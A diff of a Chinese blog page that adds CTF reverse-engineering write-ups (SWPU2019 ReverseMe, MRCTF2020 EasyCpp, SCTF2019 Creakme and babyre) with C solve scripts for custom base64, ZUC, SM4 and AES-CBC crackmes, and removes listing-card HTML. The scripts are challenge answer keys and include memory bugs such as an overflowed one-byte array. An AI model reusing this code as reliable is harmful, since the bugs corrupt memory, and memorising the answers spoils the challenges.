+<h3 id="初始化密钥"><a href="#初始化密钥" class="headerlink" title="初始化密钥"></a>初始化密钥</h3><p>对key查看交叉引用，可以进入这里，看一下对赋值后的字符串处理</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333257430.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333345804.png"></p>
+<p>通过FindCrypt可以知道是SM4加密，所以这一段就是初始化密钥了</p>
+<h3 id="SM4加密"><a href="#SM4加密" class="headerlink" title="SM4加密"></a>SM4加密</h3><p>回到encode函数</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333436418.png"></p>
+<p>可以发现最后将加密后的字符串给到了final</p>
+<h3 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h3><p>对final查看交叉引用，发现对其进行了加密</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333588664.png"></p>
+<p>这里解释一下一些东西</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333635363.png"></p>
+<blockquote>
+<p><strong>我们base64就是将三个字符也就是24位转为4个6位，做索引，这里使用移位直接将三个字符成为一个int型，也就是每个左移8位，而待会取出的时候右移四位即可取出，实现了8位与6位的转换，比较有意思</strong></p>
+</blockquote>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333792600.png"></p>
+<p>在红框函数中将传入的6位索引进行+24，也就是(index+24)%64，我们可以将base64表整体左移，就相当于index+24了</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333896782.png"></p>
+<p>再对base64表查看交叉引用，发现了将大小写转换</p>
+<h3 id="换位"><a href="#换位" class="headerlink" title="换位"></a>换位</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333519884.png"></p>
+<p>可以看到这里将最后用来对比的字符串每两个字符进行互换</p>
+<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
-char base64_table[
-                    
-                </p>
-                <a href="/2022/02/06/base64%E5%AE%9E%E7%8E%B0%E5%8F%8A%E7%BB%86%E8%8A%82%E5%89%96%E6%9E%90/" class="read-more btn waves-effect waves-light" style="background: linear-gradient(to right, #EF4DB6 0%, #C643FC 100%)" target="_blank">
-                    <i class="icon far fa-eye fa-fw"></i>阅读更多
-                </a>
-            </div>
-        </div>
+char base64_table[] = "yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx";
+char* base64_encode(char code[], char str[])
+{
+	int code_len = strlen(code);
+	int str_len ;
+	if (code_len%3)
+	{
+		str_len = (code_len / 3 + 1 ) * 4;
+	}
+	else
+		str_len = (code_len / 3) * 4;
+	int i = 0, i_ = 0;
+	for (; i &lt; code_len; i += 3, i_ += 4)
+	{
+		str[i_] = base64_table[code[i]&gt;&gt; 2];
+		str[i_ + 1] = base64_table[((code[i] &amp; 0x03) &lt;&lt; 4) | ((code[i + 1] &amp; 0xf0) &gt;&gt; 4)];
+		str[i_ + 2] = base64_table[((code[i+1] &amp; 0x0f) &lt;&lt; 2) | ((code[i + 2] &amp; 0xc0) &gt;&gt; 6)];
+		str[i_ + 3] = base64_table[(code[i + 2] &amp; 0x3f)];
+	}
+	if (code_len % 3 == 1)
+	{
+		str[i_-1] = '=';
+		str[i_ - 2] = '=';
+	}
+	else if (code_len % 3 == 2)
+	{
+		str[i_-1] = '=';
+	}
+	return str;
+}
+int findIndex(char c, char b64_table[])
+{
+	for (int i = 0; i &lt; 64; ++i)
+	{
+		if (c == b64_table[i])
+			return i;
+	}
+}
+int str_len;
+char* base64_decode(char code[], char str[], char b64_table[])
+{
+	char memstr[200] = { 0 };
+	memcpy(memstr, code, strlen(code));
+	
+	int len = strlen(code);
+	if (strstr(code, "=="))
+		str_len = len / 4 * 3 - 2;
+	else if (strstr(code, "="))
+		str_len = len / 4 * 3 - 1;
+	else
+		str_len = len / 4 * 3;
+
+	for (int i = 0, i_ = 0; i &lt; len; i += 4, i_ += 3)
+	{
+		str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; 2) | (findIndex(memstr[i + 1], b64_table) &amp; 0x30) &gt;&gt; 4;
+		str[i_+1]= (findIndex(memstr[i+1], b64_table)&amp;0xf)&lt;&lt;4 | (findIndex(memstr[i + 2], b64_table) &amp; 0x3c) &gt;&gt; 2;
+		str[i_ + 2] = (findIndex(memstr[i + 2], b64_table) &amp; 0x03) &lt;&lt; 6 | (findIndex(memstr[i + 3], b64_table));
+	}
+	str[str_len] = 0;
+	return str;
+}
+int main()
+{
+	char code[100] = "1UTAOIkpyOSWGv/mOYFY4R==";
+	char decode[100] = { 0 };
+	char encode[100] = { 0 };
+	//两位交换
+	for (int i = 0; i &lt; strlen(code); i += 2)
+	{
+		char v2 = code[i];
+		code[i] = code[i + 1];
+		code[i + 1] = v2;                         // 每两个之间进行交换
+	}
+	
+	
+	/*base64_encode(code, encode); 
+	printf("%s\n", encode);*/
+	base64_decode(code, decode,base64_table);
+	if (decode == 0)
+	{
+		return 0;
+	}
+	
+	for (int i = 0; i &lt; str_len; ++i)
+	{
+		printf("%02X", decode[i] &amp; 0xff);
+	}
+	return 0;
+}</code></pre>
+
+<p>得到59D095290DF2400614F48D276906874E</p>
+<p>SM4解密</p>
+<p><a target="_blank" rel="noopener" href="https://the-x.cn/cryptography/Sm4.aspx">https://the-x.cn/cryptography/Sm4.aspx</a></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650334038696.png"></p>
+<h1 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h1><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><p>异或、ZUC算法</p>
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>先异或SWPU_2019_CTF，再异或ZUC算法生成的数据</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350768675.png" alt="异或"></p>
+<p>ZUC算法生成异或的值</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350800049.png"></p>
+<p>unsigned int 的异或，通过动调也可以知道</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350725823.png" alt="xor"></p>
+<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">unsigned int data[8] = {
+	0xCA3E0C86, 0x19AED798, 0xA66B77E2, 0xB077A16A, 0x05379169, 0x307BF97A, 0x104B5A43, 0x28D47D86
+	};
+	unsigned int final[8] = {
+	0xF80F37B3, 0x5DAEBCBC, 0x864D5ABA, 0xD3629744, 0x1624BA4F, 0x1A729F0B, 0x266D6865, 0x67C86BBA
+	};
+	int j = 0;
+	char k[] = { 0 };
+	for (int i = 0; i &lt; 8; ++i)
+	{
+		final[i] ^= data[i];
+		k[j++] = ((char*)&amp;final[i])[0];
+		k[j++] = ((char*)&amp;final[i])[1];
+		k[j++] = ((char*)&amp;final[i])[2];
+		k[j++] = ((char*)&amp;final[i])[3];
+	}
+	k[j] = 0;
+	char key[] = "SWPU_2019_CTF";
+	for (int i = 0; i &lt; 32; ++i)
+	{
+		k[i] ^= key[i % 13];
+		printf("%c", k[i]);
+	}</code></pre>
+
+<h1 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h1><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><p>异或、替换，素因数分解</p>
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>一些关键的都已经标识出来了</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331362066.png"></p>
+<h3 id="读取输入"><a href="#读取输入" class="headerlink" title="读取输入"></a>读取输入</h3><p>读取9次key，并且拼接起来</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331630377.png"></p>
+<h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>这里面是和1异或</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331969448.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331929652.png"></p>
+<h3 id="素因数分解"><a href="#素因数分解" class="headerlink" title="素因数分解"></a>素因数分解</h3><p>这里只要能整除i，就重新进入递归，参数为整除i后的数，如果i遍历完不符合，结束循环，然后拼接上空格</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332066496.png"></p>
+<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332316391.png"></p>
+<p>将数字换成字母，空格换为=</p>
+<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>红框数组存储的是最后比较的字符串</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332398066.png"></p>
+<h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><p>这里我直接手动替换算出来的</p>
+<pre class="language-c" data-language="c"><code class="language-c">printf("%d", (293 * 8) ^ 1);
+printf("%d", (1223) ^ 1);
+printf("%d", (11 * 7 * 5 * 5 * 3) ^ 1);
+printf("%d", (2477) ^ 1); 
+printf("%d", (125 * 27) ^ 1);
+printf("%d", (3 * 3011) ^ 1);
+printf("%d", (13 * 7 * 27) ^ 1);
+printf("%d", (353 * 5 * 2) ^ 1);</code></pre>
+
+<p>md5即可</p>
+<h1 id="SCTF2019-Creakme"><a href="#SCTF2019-Creakme" class="headerlink" title="SCTF2019-Creakme"></a>SCTF2019-Creakme</h1><h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><p>AES-CBC加密、Base64加密、反调试、SMC</p>
+<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><h3 id="反调试、SMC"><a href="#反调试、SMC" class="headerlink" title="反调试、SMC"></a>反调试、SMC</h3><p>一看到这种遍历段名称的操作，熟悉SMC自解密的应该知道这是敏感的操作，也就是解密操作</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335524731.png"></p>
+<p>对于这种在输入开始前的反调试，采用attach to process</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335425994.png" alt="反调试"></p>
+<p>可以看到如果不是调试状态，就将数据强制转为函数指针</p>
+<p>这里已经解密完并执行完程序了</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335630803.png"></p>
+<p>对其交叉引用可以看到</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335692377.png"></p>
+<h3 id="AES-CBC、Base64加密"><a href="#AES-CBC、Base64加密" class="headerlink" title="AES-CBC、Base64加密"></a>AES-CBC、Base64加密</h3><p>动调发现这就是加密函数</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336067526.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336317921.png" alt="AES-CBC"></p>
+<p>可以知道该函数就是初始化密钥</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336575248.png"></p>
+<p>从这里的明文异或结合CBC可以知道是CBC模式</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337171206.png" alt="明文异或"></p>
+<p>key和iv分别为sycloversyclover、sctfsctfsctfsctf</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336622490.png" alt="iv"></p>
+<p>这里很多this指针，但是我们还是可以通过一些特征以及FindCrypt发现这是AES中的key的初始化</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336696808.png"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336732282.png" alt="轮常量异或"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336808010.png" alt="S表替换"></p>
+<p>AES-CBC加密</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337454010.png" alt="明文与iv向量的异或"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337280514.png" alt="内部加密"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336891802.png" alt="base64"></p>
+<p>进入该函数中，明显是base64加密</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336933402.png"></p>
+<p>找到码表，发现没有被改过 </p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336989928.png"></p>
+<h3 id="比较-1"><a href="#比较-1" class="headerlink" title="比较"></a>比较</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337016203.png"></p>
+<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337028435.png"></p>
+<h1 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="SCTF2019-babyre"></a>SCTF2019-babyre</h1><h2 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h2><p>base64解密、Maze、移位与异或、花指令</p>
+<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>花指令就不说了，全部都是一样的，去除即可</p>
+<p>迷宫也没啥说的，注意这里是三维迷宫 <strong>ddwwxxssxaxwwaasasyywwdd</strong> </p>
+<h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>可以看到这里先将我们的输入去table找索引，然后&amp;0x3F取出最后的六位，按位与上v5左移6，这样就得到了8位的字符，加上=4的判断，类似于base64的解密操作</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650339409043.png"></p>
+<p>直接将最后的字符串加密即可<strong>c2N0Zl85MTAy</strong></p>
+<h3 id="换位异或"><a href="#换位异或" class="headerlink" title="换位异或"></a>换位异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340193709.png"></p>
+<p>加密流程：每四个输入存入int型的变量，然后进行xor_enc加密，将前四个字符加密后存放到第四个字符的后一个字符，依次往后。</p>
+<blockquote>
+<p><strong>之所以要这样进行移位是因为如果强制转为int型，由于小端序，存储的时候是12345678，这样int取出的时候就变成了4321</strong></p>
+</blockquote>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340446709.png" alt="xor_enc"></p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340461185.png"></p>
+<p>xor_enc加密流程：将第二第三第四个字符进行异或，分为四个字节去table找到对应的值，然后重新组合成int型，再经过一系列左移右移异或操作并返回，再将返回值与第一个字符异或，这样就得到了一个加密后的结果，这里要一直等到index&lt;=29，也就是前四个字符不会加密</p>
+<p>我们可以看到这里v10只有26，那么26、27、28、29下标的v10就赋值给了v11、v12、v13、v14</p>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340936262.png"></p>
+<p>取出最后四个int型存储的十六个字节，存储到enc_flag数组，然后比较</p>
+<blockquote>
+<p><strong>假设int a=0x12345678,那么HIBYTE(a)=0x12,BYTE2(a)=0x34,BYTE1(a)=0x56</strong></p>
+</blockquote>
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340991543.png"></p>
+<p>这样我们就知道了最后的四个int型的元素，往前推，29是怎么来的呢，是flag[25]^enc(flag[26],flag[27],flag[28])得到的，所以flag[29]^enc(flag[26],flag[27],flag[28])即可得到flag[25]，前面的元素同理</p>
+<h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><p>因为涉及了ida的左右移位操作，而ida目录下defs.h有定义，所以可以直接引用</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include"defs.h"
+unsigned int v3[273] = {
+    0x000000D6, 0x00000090, 0x000000E9, 0x000000FE, 0x000000CC, 0x000000E1, 0x0000003D, 0x000000B7,
+    0x00000016, 0x000000B6, 0x00000014, 0x000000C2, 0x00000028, 0x000000FB, 0x0000002C, 0x00000005,
+    0x0000002B, 0x00000067, 0x0000009A, 0x00000076, 0x0000002A, 0x000000BE, 0x00000004, 0x000000C3,
+    0x000000AA, 0x00000044, 0x00000013, 0x00000026, 0x00000049, 0x00000086, 0x00000006, 0x00000099,
+    0x0000009C, 0x00000042, 0x00000050, 0x000000F4, 0x00000091, 0x000000EF, 0x00000098, 0x0000007A,
+    0x00000033, 0x00000054, 0x0000000B, 0x00000043, 0x000000ED, 0x000000CF, 0x000000AC, 0x00000062,
+    0x000000E4, 0x000000B3, 0x0000001C, 0x000000A9, 0x000000C9, 0x00000008, 0x000000E8, 0x00000095,
+    0x00000080, 0x000000DF, 0x00000094, 0x000000FA, 0x00000075, 0x0000008F, 0x0000003F, 0x000000A6,
+    0x00000047, 0x00000007, 0x000000A7, 0x000000FC, 0x000000F3, 0x00000073, 0x00000017, 0x000000BA,
+    0x00000083, 0x00000059, 0x0000003C, 0x00000019, 0x000000E6, 0x00000085, 0x0000004F, 0x000000A8,
+    0x00000068, 0x0000006B, 0x00000081, 0x000000B2, 0x00000071, 0x00000064, 0x000000DA, 0x0000008B,
+    0x000000F8, 0x000000EB, 0x0000000F, 0x0000004B, 0x00000070, 0x00000056, 0x0000009D, 0x00000035,
+    0x0000001E, 0x00000024, 0x0000000E, 0x0000005E, 0x00000063, 0x00000058, 0x000000D1, 0x000000A2,
+    0x00000025, 0x00000022, 0x0000007C, 0x0000003B, 0x00000001, 0x00000021, 0x00000078, 0x00000087,
+    0x000000D4, 0x00000000, 0x00000046, 0x00000057, 0x0000009F, 0x000000D3, 0x00000027, 0x00000052,
+    0x0000004C, 0x00000036, 0x00000002, 0x000000E7, 0x000000A0, 0x000000C4, 0x000000C8, 0x0000009E,
+    0x000000EA, 0x000000BF, 0x0000008A, 0x000000D2, 0x00000040, 0x000000C7, 0x00000038, 0x000000B5,
+    0x000000A3, 0x000000F7, 0x000000F2, 0x000000CE, 0x000000F9, 0x00000061, 0x00000015, 0x000000A1,
+    0x000000E0, 0x000000AE, 0x0000005D, 0x000000A4, 0x0000009B, 0x00000034, 0x0000001A, 0x00000055,
+    0x000000AD, 0x00000093, 0x00000032, 0x00000030, 0x000000F5, 0x0000008C, 0x000000B1, 0x000000E3,
+    0x0000001D, 0x000000F6, 0x000000E2, 0x0000002E, 0x00000082, 0x00000066, 0x000000CA, 0x00000060,
+    0x000000C0, 0x00000029, 0x00000023, 0x000000AB, 0x0000000D, 0x00000053, 0x0000004E, 0x0000006F,
+    0x000000D5, 0x000000DB, 0x00000037, 0x00000045, 0x000000DE, 0x000000FD, 0x0000008E, 0x0000002F,
+    0x00000003, 0x000000FF, 0x0000006A, 0x00000072, 0x0000006D, 0x0000006C, 0x0000005B, 0x00000051,
+    0x0000008D, 0x0000001B, 0x000000AF, 0x00000092, 0x000000BB, 0x000000DD, 0x000000BC, 0x0000007F,
+    0x00000011, 0x000000D9, 0x0000005C, 0x00000041, 0x0000001F, 0x00000010, 0x0000005A, 0x000000D8,
+    0x0000000A, 0x000000C1, 0x00000031, 0x00000088, 0x000000A5, 0x000000CD, 0x0000007B, 0x000000BD,
+    0x0000002D, 0x00000074, 0x000000D0, 0x00000012, 0x000000B8, 0x000000E5, 0x000000B4, 0x000000B0,
+    0x00000089, 0x00000069, 0x00000097, 0x0000004A, 0x0000000C, 0x00000096, 0x00000077, 0x0000007E,
+    0x00000065, 0x000000B9, 0x000000F1, 0x00000009, 0x000000C5, 0x0000006E, 0x000000C6, 0x00000084,
+    0x00000018, 0x000000F0, 0x0000007D, 0x000000EC, 0x0000003A, 0x000000DC, 0x0000004D, 0x00000020,
+    0x00000079, 0x000000EE, 0x0000005F, 0x0000003E, 0x000000D7, 0x000000CB, 0x00000039, 0x00000048,
+    0x000000C6, 0x000000BA, 0x000000B1, 0x000000A3, 0x00000050, 0x00000033, 0x000000AA, 0x00000056,
+    0x00000097, 0x00000091, 0x0000007D, 0x00000067, 0x000000DC, 0x00000022, 0x00000070, 0x000000B2,
+};
+unsigned int encode(unsigned int xor_final)
+{
+    int v2 = (v3[BYTE2(xor_final)] &lt;&lt; 16) | v3[(unsigned __int8)xor_final] | (v3[BYTE1(xor_final)] &lt;&lt; 8) | (v3[HIBYTE(xor_final)] &lt;&lt; 24);
+    return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);
+}
+int main()
+{
+    unsigned v10[30] = { 0 };
+    v10[26] = 0xBE040680;
+    v10[27] = 0xC5AF7647;
+    v10[28] = 0x9FCC401F;
+    v10[29] = 0xD8BF92EF;
+    for (int i = 25; i &gt;= 0; --i)
+    {
+        v10[i] = v10[i + 4] ^ encode(v10[i + 1]^v10[i + 2]^v10[i + 3]);
+    }
+    for (int i = 0; i &lt; 4; ++i)
+    {
+        printf("%c%c%c%c",((char*)(&amp;v10[i]))[0], ((char*)(&amp;v10[i]))[1], ((char*)(&amp;v10[i]))[2], ((char*)(&amp;v10[i]))[3]);
+    }
+ 
+	return 0;
+}</code></pre>
+
+<p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650342054912.png"></p>
+<p>这样子就不会存在int型读取时小端序的问题</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+      
     </div>
+
+    
+    
     
 
-</div>
-
-
-                    </div>
-                    
-                </div>
-            </div>
-        </div>
-    </div>
-    
-
-    
-
-    <!-- 所有文章卡片 -->
-    <article id="articles" class="container articles">
-        <div class="row article-row">
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="BUU刷题记录">
-                            
-                            <span class="card-title">BUU刷题记录</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                BUU刷题记录
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-18
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Reverse/">
-                            <span class="chip bg-color">Reverse</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/15/Detours%E5%AD%A6%E4%B9%A0/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Detours学习">
-                            
-                            <span class="card-title">Detours学习</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-15
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/15/API%E9%92%A9%E5%8F%96%E6%8A%80%E6%9C%AF/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="API钩取技术">
-                            
-                            <span class="card-title">API钩取技术</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-15
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="使用汇编语言编写注入代码">
-                            
-                            <span class="card-title">使用汇编语言编写注入代码</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                《逆向工程核心原理》
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-14
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="加密与解密第四版">
-                            
-                            <span class="card-title">加密与解密第四版</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                《加密与解密第四版》
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Reverse/">
-                            <span class="chip bg-color">Reverse</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Windows核心编程">
-                            
-                            <span class="card-title">Windows核心编程</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                Windows核心编程
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-13
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                Gift1a
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Windows/">
-                            <span class="chip bg-color">Windows</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
